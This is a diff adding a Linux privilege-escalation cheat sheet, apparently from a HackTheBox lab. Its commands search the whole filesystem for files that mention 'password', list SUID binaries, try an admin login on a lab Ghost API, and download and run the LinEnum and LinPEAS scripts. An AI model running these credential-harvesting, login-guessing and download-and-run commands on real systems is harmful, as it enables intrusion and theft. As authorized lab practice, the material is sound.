@@ -1,0 +1,78 @@
+//FILE CONTENTS SEARCH
+//Rrecursively search for files containing the word password from the root directory (/) to all subdirectories, you can use the following grep command:
+
+grep -rli 'password' /
+
+/*grep: The command used for searching text in files.
+-r: Recursively search through directories.
+-l: Output only the names of files that contain the matching text.
+-i: Case-insensitive search for the word "password" (matches "Password", "PASSWORD", etc.).
+'password': The keyword to search for.
+/: The root directory to start the search.
+*/
+sudo grep -rli 'password' / --exclude-dir={proc,sys,dev}
+//Performance: Searching from the root directory can be slow and may produce a lot of output. Use redirection to save the results to a file:
+
+sudo grep -rli 'password' / > results.txt
+//Filtering Binary Files: If you want to avoid searching binary files, grep automatically skips them in newer versions. If necessary, you can explicitly add the --text option to force text-only matching:
+
+
+grep -rin 'password' /
+
+/*
+-r: Recursively search through directories.
+-n: Show line numbers along with matching lines.
+-i: Perform a case-insensitive search for "password".
+'password': The keyword to search for.
+/: The root directory to start the search.
+*/
+//DIRECTORY & FILE SEARCH 
+
+find
+
+/*type Options in find
+f: Regular file ->Matches standard files (e.g., text files, binary files, etc.), excluding directories, symlinks, and other special types.
+
+d: Directory ->  Matches directories.
+
+l: Symbolic link -> Matches symbolic links (shortcuts).
+
+c: Character device -> Matches character special files, which are used for devices that handle data as a stream of characters (e.g., /dev/tty).
+
+b: Block device -> Matches block special files, which are used for devices that handle data in blocks (e.g., /dev/sda).
+
+p: Named pipe (FIFO) -> Matches named pipes, which are used for interprocess communication.
+
+s: Socket ->  Matches socket files, which allow communication between processes over the network or locally.
+
+D: Door (on systems that support it, like Solaris) -> Matches door files, which are a type of IPC mechanism.
+*/
+
+//This will list any files with SUID permissions on the system. SUID binaries run with the permissions of the owner (e.g., root), which could help escalate privileges.
+find / -perm -4000 2>/dev/null
+
+
+//Check for Misconfigured Services. Service-related directories (like /tmp/systemd-private-*) sometimes contain misconfigurations.
+systemctl list-units --type=service
+
+//Check if there are any services running with unusual permissions or unexpected root-level access.
+journalctl -xe
+
+
+curl -X POST http://linkvortex.htb/ghost/api/admin/session \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin@linkvortex.htb","password":"password123"}'
+
+
+//Linux Enumeration Tools
+
+//LinEnum: A script that automates system enumeration and searches for common privilege escalation opportunities.
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+//LinPEAS: Another enumeration tool that looks for privilege escalation paths.
+wget https://github.com/carlospolop/PEAS/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+  
